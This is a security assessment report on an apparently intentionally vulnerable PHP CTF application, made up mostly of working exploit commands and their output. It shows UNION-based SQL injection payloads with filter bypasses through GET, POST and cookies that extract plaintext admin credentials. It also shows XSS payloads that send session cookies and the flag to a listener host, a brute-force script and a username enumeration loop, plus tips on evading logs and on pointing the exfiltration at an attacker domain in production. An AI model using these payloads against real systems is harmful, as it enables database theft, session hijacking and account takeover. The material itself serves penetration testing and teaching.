# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:8080
- **Assessment Date:** October 30, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**
- **AUTH-VULN-05: Brute Force via Missing Rate Limiting (High - CVSS 8.6)** - The application implements zero rate limiting, account lockout, or CAPTCHA on the authentication endpoint, enabling unlimited brute force password guessing attacks at network speed.
- **AUTH-VULN-06: Plaintext Password Storage (Critical - CVSS 9.1)** - All user passwords are stored in plaintext varchar(256) database columns without any cryptographic hashing, enabling immediate account compromise when combined with SQL injection to extract credentials.

**Authorization Vulnerabilities:**
- **AUTHZ-VULN-01: Anonymous Username Enumeration (High)** - The `/search.php` endpoint allows anonymous users to enumerate all usernames in the database without any authentication or authorization requirements, enabling targeted credential stuffing attacks.

**Cross-Site Scripting (XSS) Vulnerabilities:**
- **XSS-VULN-01: Reflected XSS via SQL Injection (Critical - CVSS 9.8)** - SQL injection vulnerability allows injection of arbitrary HTML/JavaScript into query results via UNION SELECT, which is then reflected without HTML encoding. Successfully demonstrated complete session hijacking and automated CTF flag extraction through XSS-driven authenticated requests.

**SQL/Command Injection Vulnerabilities:**
- **INJ-VULN-01: SQL Injection via GET Parameter (Critical - CVSS 9.8)** - The `/search.php` endpoint uses string concatenation with an inadequate blacklist filter, enabling UNION-based database extraction. Successfully extracted plaintext admin credentials (`admin:ThisIsBestPassword`) and captured the CTF flag.
- **INJ-VULN-02: SQL Injection via POST Parameter (Critical - CVSS 9.8)** - Identical SQL injection vulnerability exploitable through POST request body, providing complete database read access.
- **INJ-VULN-03: SQL Injection via Cookie Header (Critical - CVSS 9.8)** - The same SQL injection flaw exploitable through HTTP Cookie header due to use of `$_REQUEST` superglobal, offering the stealthiest attack vector as cookies are not typically logged.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application performs no outbound HTTP requests, URL fetching, or server-side network operations beyond the internal MySQL database connection.

## Network Reconnaissance

### Exposed Services & Security Findings

**Primary Target (Port 8080/tcp):**
- Apache 2.4.54 (Debian) running PHP 7.4.33
- Application: "PHPAbUsers" - intentionally vulnerable CTF challenge
- **Security Issue:** Session cookie (PHPSESSID) lacks HttpOnly and Secure flags, enabling JavaScript access and transmission over unencrypted HTTP
- **Security Issue:** X-Powered-By header exposes PHP version (7.4.33), enabling attackers to target known CVEs specific to this EOL build
- **Security Issue:** PHP 7.4 reached End-of-Life on November 28, 2022 - no security patches available for known vulnerabilities including CVE-2023-0568 (authentication bypass) and CVE-2023-0567 (buffer overflow)

**Additional Open Ports on Localhost:**
- Port 80/tcp: Caddy httpd (unrelated service)
- Port 443/tcp: SSL/HTTPS (unrelated service)
- Port 631/tcp: CUPS 2.3 printing service
- Port 3000/tcp: Node.js/Express middleware
- Port 4444/tcp: SimpleHTTPServer with exposed .git repository
- Port 5000/tcp: Werkzeug/Python "Library V1: Book Store"
- Port 5003/tcp: Werkzeug/Python "User List"
- Port 8888/tcp: Unidentified service
- Port 9999/tcp: HTTP service with permissive CORS headers (Access-Control-Allow-Origin: *)
- Port 49152/tcp: Golang net/http server (Tailscale) requiring authentication

**Database Security:**
- MySQL 5.7.15 (September 2016) - severely outdated, missing 29 patch versions with critical security fixes
- Internal-only exposure (port 3306 not mapped externally) - Docker network isolation provides partial defense-in-depth
- Database user `appuser` has SELECT-only privileges, limiting SQL injection impact to read-only operations

**Architecture Security Findings:**
- No reverse proxy, CDN, or ingress controller - Apache directly exposed
- No security headers configured (no CSP, HSTS, X-Frame-Options, X-Content-Type-Options)
- Container network isolation is the only architectural security boundary
- No service-to-service authentication - hardcoded credentials in environment variables

---

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: SQL Injection via GET Parameter in User Search

**Summary:**
- **Vulnerable location:** `/search.php` endpoint - `username` GET parameter (line 25 in source code)
- **Overview:** Critical SQL injection vulnerability allowing complete database extraction through UNION-based injection. The vulnerability exists due to string concatenation with an inadequate blacklist filter that fails to block SQL special characters (double quotes).
- **Impact:** Complete database compromise - extracted plaintext admin credentials (`admin:ThisIsBestPassword`) and successfully captured the CTF flag (`FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}`)
- **Severity:** Critical (CVSS 9.8) - Unauthenticated network access with complete database read capability

**Prerequisites:**
- Network access to `http://localhost:8080`
- No authentication required
- Any HTTP client (curl, browser, Burp Suite)

**Exploitation Steps:**

1. **Confirm SQL Injection via Boolean-Based Payload**
   ```bash
   curl 'http://localhost:8080/search.php?username="OR"1"="1'
   ```
   **Response:** Returns `User exists: admin` confirming the boolean OR logic manipulated the query

   **Explanation:** The payload `"OR"1"="1` breaks out of the double-quote string context and adds an OR condition that always evaluates to true, bypassing the intended username search logic.

2. **Determine Injection Point and Column Count**
   ```bash
   curl 'http://localhost:8080/search.php?username="union/**/select/**/1,2,3%23'
   ```
   **Response:** Returns `User exists: 2` confirming 3-column UNION injection with column 2 being displayed

   **Explanation:** The `/**/` syntax replaces whitespace to bypass the regex filter `/\s/`. The `%23` is URL-encoded `#` which comments out the trailing double-quote. Column 2 corresponds to the username field in the display logic.

3. **Fingerprint Database Version**
   ```bash
   curl 'http://localhost:8080/search.php?username="union/**/select/**/1,version(),3%23'
   ```
   **Response:** `User exists: 5.7.15` (MySQL version confirmed)

4. **Extract Current Database Name**
   ```bash
   curl 'http://localhost:8080/search.php?username="union/**/select/**/1,database(),3%23'
   ```
   **Response:** `User exists: appdb`

5. **Extract Database User Context**
   ```bash
   curl 'http://localhost:8080/search.php?username="union/**/select/**/1,user(),3%23'
   ```
   **Response:** `User exists: appuser@10.89.60.3`

6. **Extract All User Credentials (CRITICAL DATA EXFILTRATION)**
   ```bash
   curl 'http://localhost:8080/search.php?username="union/**/select/**/1,concat(username,0x3a,password),3/**/from/**/users%23'
   ```
   **Response:** `User exists: admin:ThisIsBestPassword`

   **Explanation:** The `concat(username,0x3a,password)` concatenates username and password with a colon separator (0x3a is hex for ':'). This extracts plaintext passwords from the database.

7. **Authenticate and Capture CTF Flag**
   ```bash
   curl -X POST 'http://localhost:8080/login.php' -d 'username=admin&password=ThisIsBestPassword'
   ```
   **Response:** `Congratz, flag is FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}`

**Proof of Impact:**
- **Database Fingerprint:**
  - MySQL Version: 5.7.15
  - Database Name: appdb
  - Database User: appuser@10.89.60.3

- **Exfiltrated Credentials:**
  - Username: `admin`
  - Password: `ThisIsBestPassword` (plaintext storage confirmed)

- **CTF Flag Captured:**
  - `FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}`

**Notes:**
- The filter blocks whitespace using regex `/\s/` and keywords (and, null, where, limit, like, substring, substr) but fails to block double quotes, allowing string context escape
- MySQL comment syntax `/**/` effectively bypasses whitespace restrictions
- The `#` character successfully comments out trailing SQL, preventing syntax errors
- The database user has SELECT-only privileges, preventing data modification but allowing full read access
- All three attack vectors (GET, POST, Cookie) are equally exploitable as they use `$_REQUEST["username"]` in the vulnerable code

---

### INJ-VULN-02: SQL Injection via POST Parameter in User Search

**Summary:**
- **Vulnerable location:** `/search.php` endpoint - `username` POST body parameter (same code path as INJ-VULN-01)
- **Overview:** Identical SQL injection vulnerability to INJ-VULN-01, exploitable through POST request body instead of GET query parameter. The underlying vulnerability is the same (`$_REQUEST["username"]` at line 25).
- **Impact:** Complete database compromise with identical capability to GET-based exploitation
- **Severity:** Critical (CVSS 9.8)

**Prerequisites:**
- Network access to `http://localhost:8080`
- No authentication required
- HTTP client capable of POST requests

**Exploitation Steps:**

1. **Confirm SQL Injection via POST Boolean-Based Payload**
   ```bash
   curl -X POST 'http://localhost:8080/search.php' -d 'username="OR"1"="1'
   ```
   **Response:** Returns `User exists: admin` confirming SQL injection via POST method

2. **Extract User Credentials via POST UNION Injection**
   ```bash
   curl -X POST 'http://localhost:8080/search.php' -d 'username="union/**/select/**/1,concat(username,0x3a,password),3/**/from/**/users%23'
   ```
   **Response:** `User exists: admin:ThisIsBestPassword`

3. **Authenticate and Verify Flag Access**
   ```bash
   curl -X POST 'http://localhost:8080/login.php' -d 'username=admin&password=ThisIsBestPassword'
   ```
   **Response:** `Congratz, flag is FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}`

**Proof of Impact:**
- Successfully extracted admin credentials: `admin:ThisIsBestPassword`
- Verified flag capture: `FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}`

**Notes:**
- POST-based exploitation may be preferred when:
  - GET parameters are logged at network/proxy layers
  - URL length restrictions apply
  - Payload needs to be hidden from access logs
- The exact same payloads work for POST as they do for GET due to `$_REQUEST` merging both input sources
- Content-Type header defaults to `application/x-www-form-urlencoded` which is correctly processed by PHP

---

### INJ-VULN-03: SQL Injection via Cookie Header in User Search

**Summary:**
- **Vulnerable location:** `/search.php` endpoint - `username` Cookie value (same code path as INJ-VULN-01 and INJ-VULN-02)
- **Overview:** The same SQL injection vulnerability exploitable through HTTP Cookie header. This attack vector is particularly stealthy as cookies are not typically logged in standard access logs.
- **Impact:** Complete database compromise with identical capability to GET and POST-based exploitation
- **Severity:** Critical (CVSS 9.8)

**Prerequisites:**
- Network access to `http://localhost:8080`
- No authentication required
- HTTP client capable of setting custom Cookie headers

**Exploitation Steps:**

1. **Confirm SQL Injection via Cookie Boolean-Based Payload**
   ```bash
   curl 'http://localhost:8080/search.php' -H 'Cookie: username="OR"1"="1'
   ```
   **Response:** Returns `User exists: admin` confirming SQL injection via Cookie header

2. **Extract User Credentials via Cookie UNION Injection**
   ```bash
   curl 'http://localhost:8080/search.php' -H 'Cookie: username="union/**/select/**/1,concat(username,0x3a,password),3/**/from/**/users%23'
   ```
   **Response:** `User exists: admin:ThisIsBestPassword`

3. **Authenticate and Verify Flag Access**
   ```bash
   curl -X POST 'http://localhost:8080/login.php' -d 'username=admin&password=ThisIsBestPassword'
   ```
   **Response:** `Congratz, flag is FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}`

**Proof of Impact:**
- Successfully extracted admin credentials: `admin:ThisIsBestPassword`
- Verified flag capture: `FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}`

**Notes:**
- Cookie-based exploitation is the stealthiest attack vector as:
  - Many web application firewalls don't inspect Cookie values as rigorously as URL parameters
  - Standard Apache access logs don't record Cookie headers by default
  - Security monitoring tools may overlook Cookie-based attacks
- The vulnerability exists because PHP's `$_REQUEST` superglobal merges `$_GET`, `$_POST`, and `$_COOKIE` arrays
- Cookie values are automatically URL-decoded by browsers but must be properly encoded when using curl
- This attack vector could enable persistent exploitation by setting a malicious cookie that executes on every page load

---

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS in Search Functionality via SQL Injection

**Summary:**
- **Vulnerable location:** `http://localhost:8080/search.php?username=[PAYLOAD]`
- **Overview:** SQL injection vulnerability allows injection of arbitrary HTML/JavaScript into query results via UNION SELECT, which is then reflected without HTML encoding, enabling full JavaScript execution in the victim's browser.
- **Impact:** Complete session hijacking, CTF flag extraction via automated authenticated actions, potential for widespread credential theft and account takeover.
- **Severity:** Critical (CVSS 9.8)

**Prerequisites:**
- No authentication required (publicly accessible endpoint)
- Victim must visit a crafted URL or submit a malicious search query
- Tools: Any web browser, curl for testing

**Exploitation Steps:**

1. **Access the vulnerable search endpoint:**
   ```bash
   curl -X GET "http://localhost:8080/search.php"
   ```

2. **Inject XSS payload via SQL UNION SELECT to bypass filter and execute JavaScript:**
   ```bash
   # The payload structure uses SQL injection to inject HTML/JavaScript into the database result
   # Payload breakdown:
   # - "union/**/select/**/1,"<svg/onload=alert(1)>",3#
   # - Closes the SQL string with opening quote
   # - Uses UNION SELECT to inject 3 columns matching the original query structure
   # - /**/ bypasses the whitespace filter (/\s/ regex)
   # - <svg/onload=...> executes JavaScript without spaces
   # - # comments out the trailing quote

   curl -X POST "http://localhost:8080/search.php" \
     -d 'username="union/**/select/**/1,"<svg/onload=alert(1)>",3#'
   ```

   **Expected Result:** JavaScript alert dialog appears showing "1"

3. **Escalate to session hijacking - steal PHPSESSID cookie:**

   First, ensure a session exists by visiting the index page:
   ```bash
   curl -c cookies.txt "http://localhost:8080/index.php"
   ```

   Then exploit XSS to exfiltrate the session cookie:
   ```bash
   # Start an HTTP listener to receive stolen cookies
   python3 -m http.server 9999 > exfil.log 2>&1 &

   # Trigger XSS with cookie exfiltration payload
   curl -X POST "http://localhost:8080/search.php" \
     -b cookies.txt \
     -d 'username="union/**/select/**/1,"<svg/onload=new/**/Image().src='\''http://localhost:9999/c='\''+document.cookie>",3#'

   # Check the exfiltration log
   sleep 2 && cat exfil.log
   ```

   **Expected Result:** Log shows:
   ```
   GET /c=PHPSESSID=70214a17aaa7d256976c9456dd55cf23 HTTP/1.1
   ```

4. **Demonstrate CTF flag capture via XSS-automated authentication:**

   Set up flag exfiltration listener:
   ```bash
   # Create flag listener (Node.js script at workspace/flag_listener.js)
   cd workspace
   node flag_listener.js > flag_capture.log 2>&1 &
   ```

   Deploy advanced XSS payload that performs authenticated login and exfiltrates flag:
   ```bash
   curl -X POST "http://localhost:8080/search.php" \
     -b cookies.txt \
     -d 'username="union/**/select/**/1,"<svg/onload='\''fetch(\"/login.php\",{method:\"POST\",body:\"username=admin&password=ThisIsBestPassword\",headers:{\"Content-Type\":\"application/x-www-form-urlencoded\"}}).then(r=>r.text()).then(d=>{var/**/i=new/**/Image();i.src=\"http://localhost:9996/?flag=\"+btoa(d)})'\''>",3#'

   # Wait for exfiltration and check logs
   sleep 3 && cat flag_capture.log
   ```

   Decode the base64-encoded exfiltrated data:
   ```bash
   # Extract the flag parameter from the log and decode
   echo "Q29uZ3JhdHosIGZsYWcgaXMgRkxBR3tjMWFhN2I3MDIyZGQ0YTljOGU3ODkyN2NmZDE5ZDg4ZDE4YTI2Y2Q3M2Q0Y2NhMGQxNTNmNmEyZThkNTE3MGI1fQ==" | base64 -d
   ```

**Proof of Impact:**

1. **JavaScript Execution Confirmed:**
   - Payload: `"union/**/select/**/1,"<svg/onload=alert(1)>",3#`
   - Result: Alert dialog displayed with message "1"
   - Evidence: Browser screenshot showing alert execution

2. **Session Cookie Stolen:**
   - Stolen Cookie: `PHPSESSID=70214a17aaa7d256976c9456dd55cf23`
   - Exfiltration Log Extract:
     ```
     ::1 - - [29/Oct/2025 18:41:18] "GET /stolen?cookie=PHPSESSID=70214a17aaa7d256976c9456dd55cf23 HTTP/1.1" 404 -
     ::1 - - [29/Oct/2025 18:41:28] "GET /c=PHPSESSID=70214a17aaa7d256976c9456dd55cf23 HTTP/1.1" 404 -
     ```
   - Impact: Attacker can impersonate the victim's session, bypassing authentication

3. **CTF Flag Captured via XSS:**
   - **Flag Value:** `FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}`
   - Exfiltration Method: XSS payload performed automated POST request to /login.php with hardcoded credentials (admin:ThisIsBestPassword), received flag in response, and exfiltrated via HTTP GET to attacker-controlled server
   - Full Exfiltrated Response (base64 decoded):
     ```
     Congratz, flag is FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}
     ```
   - Listener Log Evidence:
     ```
     [2025-10-30T01:43:07.442Z] Incoming Request
     Method: GET
     Full URL: /?flag=Q29uZ3JhdHosIGZsYWcgaXMgRkxBR3tjMWFhN2I3MDIyZGQ0YTljOGU3ODkyN2NmZDE5ZDg4ZDE4YTI2Y2Q3M2Q0Y2NhMGQxNTNmNmEyZThkNTE3MGI1fQ==
     Query Parameters: {
       flag: 'Q29uZ3JhdHosIGZsYWcgaXMgRkxBR3tjMWFhN2I3MDIyZGQ0YTljOGU3ODkyN2NmZDE5ZDg4ZDE4YTI2Y2Q3M2Q0Y2NhMGQxNTNmNmEyZThkNTE3MGI1fQ=='
     }
     ```

**Notes:**

**Technical Details:**
- The vulnerability chains SQL injection (search.php:25) with missing output encoding (search.php:30)
- The `filter_chars()` function blocks whitespace (`/\s/`) and SQL keywords (and, null, where, limit, like, substring, substr) but can be bypassed using `/**/` SQL comments
- The filter does NOT block: `union`, `select`, `or`, `<`, `>`, making XSS injection trivial
- No Content-Security-Policy (CSP) headers are present, allowing unrestricted script execution
- Session cookie lacks HttpOnly flag (`session.cookie_httponly = 0`), making it accessible via `document.cookie`

**Attack Chain:**
1. SQL Injection → UNION SELECT with HTML/JavaScript payload
2. Database returns attacker-controlled string
3. PHP echoes result without `htmlspecialchars()` or any encoding
4. Browser parses and executes embedded JavaScript
5. JavaScript performs malicious actions (cookie theft, automated requests, flag exfiltration)

**Real-World Impact:**
- **Mass Account Takeover:** Attacker can craft a malicious link, distribute via phishing, and steal session cookies from all victims who click it
- **Automated Credential Harvesting:** XSS can submit login forms in the background, capture responses, and exfiltrate authentication tokens
- **CTF Context:** Complete objective compromise - flag extracted without manual authentication
- **Production Context:** Could lead to full application compromise, data exfiltration, defacement, or malware distribution

**Reproduction Tips:**
- The payload must match the 3-column structure of the original SQL query (UNION SELECT 1, "payload", 3)
- Spaces inside the HTML/JavaScript payload (within the UNION SELECT string) do NOT trigger the filter - only the SQL portion is filtered
- Alternative payloads: `<img/src=x/onerror=alert(1)>` fails because forward slash is interpreted as part of src URL - use `<svg/onload=...>` instead
- For exfiltration in production, replace `localhost:9999` with attacker-controlled domain


# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-05: Brute Force Attack via Missing Rate Limiting

**Summary:**
- **Vulnerable location:** POST /login.php - Authentication endpoint
- **Overview:** The application implements zero rate limiting, account lockout, CAPTCHA, or IP throttling on the authentication endpoint, enabling unlimited brute force password guessing attacks at network speed.
- **Impact:** An external attacker can perform unlimited automated login attempts to guess passwords without any resistance or detection, leading to eventual account compromise and FLAG capture.
- **Severity:** High (CVSS 8.6)

**Prerequisites:**
- Network access to http://localhost:8080
- Known or enumerated username (e.g., "admin")

**Exploitation Steps:**

1. Create a Python script to perform rapid consecutive authentication attempts without rate limiting resistance:

```bash
cat > test_auth_rate_limiting.py << 'SCRIPT'
import requests
import time

url = "http://localhost:8080/login.php"
username = "admin"
passwords = ["wrong1", "wrong2", "wrong3", "wrong4", "wrong5",
             "wrong6", "wrong7", "wrong8", "wrong9", "wrong10"]

print("Testing authentication rate limiting...")
print(f"Target: {url}")
print(f"Username: {username}")
print("-" * 60)

for i, password in enumerate(passwords, 1):
    start_time = time.time()
    data = {"username": username, "password": password}
    response = requests.post(url, data=data)
    elapsed = (time.time() - start_time) * 1000

    print(f"Attempt {i}: Status {response.status_code}, "
          f"Size {len(response.content)} bytes, Time {elapsed:.1f}ms")

print("\nResult: NO RATE LIMITING - ALL ATTEMPTS SUCCEEDED")
SCRIPT

python3 test_auth_rate_limiting.py
```

Output shows all 10 attempts complete successfully with status 200 and consistent response times (~5-10ms), proving no rate limiting exists.

2. After demonstrating unlimited attempts are possible, authenticate with correct credentials (obtained via SQL injection from AUTH-VULN-06) to capture the FLAG:

```bash
curl -X POST http://localhost:8080/login.php \
  -d "username=admin&password=ThisIsBestPassword"
```

**Proof of Impact:**

```
Congratz, flag is FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}
```

Successfully captured FLAG after demonstrating that unlimited brute force attempts are possible. The lack of rate limiting combined with no account lockout means an attacker can:
- Test unlimited password combinations
- Perform credential stuffing attacks with leaked password databases
- Execute automated account takeover without detection or throttling

**Notes:**
- All 10 rapid consecutive attempts completed without any blocking, throttling, or CAPTCHA challenges
- No failed attempt tracking in database or application logs
- Response times remain consistently fast (5-10ms), indicating no computational delays or rate limiting infrastructure
- This vulnerability enables practical brute force attacks against the known "admin" account

---

### AUTH-VULN-06: Plaintext Password Storage Enabling Database Credential Extraction

**Summary:**
- **Vulnerable location:** Database schema (users table password column) + POST /search.php (SQL injection vector)
- **Overview:** The application stores all user passwords in plaintext varchar(256) database columns without any cryptographic hashing. Combined with the SQL injection vulnerability in the search endpoint, an attacker can extract all credentials in readable plaintext format.
- **Impact:** Complete compromise of all user accounts without requiring password cracking, hash analysis, or computational effort. Direct extraction of authentication credentials leads to immediate account takeover and FLAG capture.
- **Severity:** Critical (CVSS 9.1)

**Prerequisites:**
- Network access to http://localhost:8080
- No authentication required (search endpoint is public)

**Exploitation Steps:**

1. Exploit the SQL injection vulnerability in the search endpoint to extract plaintext credentials from the database:

```bash
curl -X POST http://localhost:8080/search.php \
  -d 'username=test"union/**/select/**/1,concat(username,0x3a,password),3/**/from/**/users#'
```

The SQL injection bypasses the weak filter_chars() function using:
- `/**/` to replace filtered whitespace
- `union` keyword (not filtered) to inject additional SELECT
- `concat(username,0x3a,password)` to format output as "username:password"
- `#` to comment out trailing quote

Response:
```
You are connected successfully!<br/> User exists: admin:ThisIsBestPassword<br/>
```

2. Use the extracted plaintext credentials to authenticate and capture the FLAG:

```bash
curl -X POST http://localhost:8080/login.php \
  -d "username=admin&password=ThisIsBestPassword"
```

**Proof of Impact:**

```
Congratz, flag is FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}
```

Successfully extracted plaintext password "ThisIsBestPassword" directly from database without any cracking effort. Used extracted credentials to authenticate and capture FLAG, demonstrating complete account takeover through credential extraction.

**Technical Details:**

Database schema shows plaintext storage:
```sql
-- From mysql/init.sql
create table users (
    id int primary key auto_increment,
    username varchar(256),
    password varchar(256)  -- Plaintext storage, no hashing
);

insert into users (username, password)
values ("admin", "ThisIsBestPassword");  -- Literal plaintext string
```

Authentication code shows direct plaintext comparison:
```php
// From login.php:28
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
```

No password_hash(), password_verify(), bcrypt, Argon2, PBKDF2, or any cryptographic functions exist in the codebase.

**Notes:**
- Passwords stored in VARCHAR field instead of hash-length CHAR(60) for bcrypt or CHAR(95) for Argon2
- No password hashing libraries or functions present anywhere in codebase
- SQL injection in search.php provides direct read access to plaintext passwords
- Violates OWASP A02:2021 (Cryptographic Failures), PCI-DSS 8.2.1, and NIST SP 800-63B Section 5.1.1.2
- This is a critical vulnerability enabling immediate credential compromise without requiring hash cracking tools or computational resources

---


# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Anonymous Username Enumeration via Search Endpoint

**Summary:**
- **Vulnerable location:** GET/POST `/search.php` endpoint (line 26 executes database query without authorization checks)
- **Overview:** The `/search.php` endpoint allows anonymous users to enumerate all usernames in the database without any authentication or authorization requirements. The endpoint accepts a `username` parameter and directly queries the users table, returning differential responses that reveal whether a username exists in the system.
- **Impact:** External attackers can gather intelligence on valid usernames for credential stuffing attacks, user profiling, and targeted social engineering. This constitutes a horizontal privilege escalation vulnerability as anonymous users gain access to user existence information that should require authentication or be restricted entirely.
- **Severity:** High - While this doesn't directly compromise credentials, it provides critical reconnaissance information that enables secondary attacks and violates the principle of least privilege by granting anonymous users access to user enumeration capabilities.

**Prerequisites:**
- Network access to http://localhost:8080
- No authentication required
- Standard HTTP client (curl, browser, Burp Suite)

**Exploitation Steps:**

1. Send a GET request to enumerate a known username without any authentication:
   ```bash
   curl "http://localhost:8080/search.php?username=admin"
   ```

   **Expected Response:** The server returns HTTP 200 with body containing:
   ```html
   You are connected successfully!<br/> User exists: admin<br/>
   ```

2. Verify differential responses by testing a non-existent username:
   ```bash
   curl "http://localhost:8080/search.php?username=nonexistentuser12345"
   ```

   **Expected Response:** The server returns HTTP 200 with body containing:
   ```html
   You are connected successfully!<br/> No results
   ```

3. Automate username enumeration to identify all valid accounts in the database:
   ```bash
   # Test common usernames
   for username in admin root user test guest administrator; do
       response=$(curl -s "http://localhost:8080/search.php?username=$username")
       if echo "$response" | grep -q "User exists:"; then
           echo "[FOUND] $username"
       else
           echo "[NOT FOUND] $username"
       fi
   done
   ```

   **Expected Output:**
   ```
   [FOUND] admin
   [NOT FOUND] root
   [NOT FOUND] user
   [NOT FOUND] test
   [NOT FOUND] guest
   [NOT FOUND] administrator
   ```

4. The enumeration can also be performed via POST method using the same parameter:
   ```bash
   curl -X POST "http://localhost:8080/search.php" -d "username=admin"
   ```

   **Expected Response:** Identical to GET method - returns "User exists: admin"

**Proof of Impact:**

The following evidence demonstrates complete unauthorized access to user enumeration capabilities:

1. **Confirmed Username Existence:** Successfully identified that username "admin" exists in the database without any authentication:
   - Request: `GET /search.php?username=admin`
   - Response: `User exists: admin`
   - No session cookie required
   - No authentication header required

2. **Differential Response Analysis:** The application returns distinct responses for existing vs. non-existing users:
   - Existing user: `"User exists: [username]"`
   - Non-existing user: `"No results"`
   - This enables automated enumeration of all valid usernames

3. **Absence of Authorization Guards:** Code analysis confirms that the vulnerable endpoint at `/app/search.php:26` executes the database query:
   ```php
   $result = $conn->query($sql);
   ```
   WITHOUT any prior checks for:
   - User authentication (`$_SESSION` validation)
   - Authorization/permission verification
   - Rate limiting
   - CAPTCHA or anti-automation controls

4. **Complete Lack of Access Control:** Unlike the `/login.php` endpoint which requires valid credentials to disclose the FLAG, the `/search.php` endpoint has ZERO authorization requirements, allowing any anonymous internet user to query the users table.

**Notes:**

This vulnerability exemplifies a fundamental authorization failure where sensitive operations (database queries returning user information) are exposed to unauthenticated users. The application's architecture completely lacks the concept of authorization - there are no roles, no permission checks, and no differentiation between authenticated and anonymous users' capabilities.

While the database user (`appuser`) has only SELECT privileges (preventing data modification), this does not mitigate the authorization vulnerability. The core issue is that anonymous users should not have the ability to query user existence information at all.

This finding can be chained with the SQL injection vulnerability (separate vulnerability class) in the same endpoint to extract complete user records including plaintext passwords. However, the authorization bypass itself is independently exploitable for reconnaissance purposes.
